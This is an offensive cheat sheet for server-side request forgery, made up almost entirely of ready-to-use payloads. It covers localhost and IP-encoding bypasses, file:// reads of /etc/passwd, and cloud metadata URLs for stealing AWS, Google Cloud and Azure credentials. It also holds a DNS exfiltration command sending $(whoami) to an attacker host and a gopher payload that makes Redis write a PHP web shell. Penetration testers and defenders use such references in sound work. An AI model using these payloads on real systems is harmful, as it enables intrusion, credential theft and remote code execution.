# Server-Side Request Forgery (SSRF)

## Table of Contents
- [Basic SSRF](#basic-ssrf)
- [Testing for SSRF](#testing-for-ssrf)
- [Bypass Techniques](#bypass-techniques)
- [Protocol Smuggling](#protocol-smuggling)
- [Cloud Metadata](#cloud-metadata)
- [Blind SSRF](#blind-ssrf)
- [SSRF to RCE](#ssrf-to-rce)

---

## Basic SSRF

### Common Parameters

```
url=
path=
src=
dest=
redirect=
uri=
callback=
domain=
host=
page=
feed=
load=
```

### Basic Payloads

```
http://127.0.0.1/
http://localhost/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:22/
http://127.0.0.1:8080/
http://127.0.0.1:3306/
http://[::1]/
```

---

## Testing for SSRF

### External Callback

```shell
# Start listener
python3 -m http.server 80
nc -lvnp 80

# Inject
http://$lhost/
http://$lhost:8080/ssrf-test
```

### Burp Collaborator / Interactsh

```shell
# Using interactsh
interactsh-client

# Payload
http://xyz.interact.sh/
```

### Internal Port Scanning

```shell
# Fuzz internal ports
ffuf -w ./ports.txt:PORT -u "http://$rhost/load?q=http://127.0.0.1:PORT" -fs 30
```

### Generate Port List

```shell
for port in {1..65535}; do echo $port >> ports.txt; done
```

---

## Bypass Techniques

### Localhost Alternatives

```
http://127.0.0.1/
http://localhost/
http://127.1/
http://127.0.1/
http://0.0.0.0/
http://0/
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://localtest.me/
http://127.0.0.1.nip.io/
```

### Decimal IP

```shell
# Convert IP to decimal
127.0.0.1 = 2130706433

# Payload
http://2130706433/
```

### Hex IP

```
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/
```

### Octal IP

```
http://0177.0.0.01/
http://017700000001/
```

### URL Encoding

```
http://%31%32%37%2e%30%2e%30%2e%31/
http://127.0.0.1%00@evil.com/
```

### DNS Rebinding

```
# Point DNS to 127.0.0.1
http://your-rebind-domain.com/
```

### URL Parser Bypass

```
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1:80@evil.com/
http://evil.com\@127.0.0.1/
```

### Double URL Encoding

```
http://%252f%252f127.0.0.1/
```

---

## Protocol Smuggling

### File Protocol

```
file:///etc/passwd
file:///C:/Windows/win.ini
file://127.0.0.1/etc/passwd
```

### Gopher Protocol

```
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
```

### Dict Protocol

```
dict://127.0.0.1:11211/stat
```

### SFTP Protocol

```
sftp://attacker.com:11111/
```

---

## Cloud Metadata

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4
```

### AWS IMDSv2

```shell
# Get token
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# Use token
curl http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Google Cloud

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/
```

Add header: `Metadata-Flavor: Google`

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2020-09-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Add header: `Metadata: true`

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## Blind SSRF

### Time-Based Detection

```shell
# Compare response times
curl "http://$rhost/fetch?url=http://127.0.0.1:22"  # SSH - slower
curl "http://$rhost/fetch?url=http://127.0.0.1:81"  # Closed - faster
```

### Out-of-Band Detection

```shell
# Use external server
curl "http://$rhost/fetch?url=http://$lhost/"

# DNS exfiltration
curl "http://$rhost/fetch?url=http://$(whoami).$lhost/"
```

### Error-Based Detection

- Different error messages for open/closed ports
- Different responses for internal vs external

---

## SSRF to RCE

### Internal Services

#### Redis (Port 6379)

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php system($_GET['cmd']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### FastCGI (Port 9000)

```
gopher://127.0.0.1:9000/_...
```

### SSRF Exploitation Tools

```shell
# Gopherus - Generate payloads
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
python gopherus.py --exploit mysql
```

---

## Payload Cheat Sheet

| Payload | Description |
| :--- | :--- |
| `http://127.0.0.1/` | Basic localhost |
| `http://[::1]/` | IPv6 localhost |
| `http://2130706433/` | Decimal IP |
| `http://0x7f000001/` | Hex IP |
| `file:///etc/passwd` | File protocol |
| `http://169.254.169.254/` | Cloud metadata |
| `gopher://127.0.0.1:25/` | Gopher protocol |
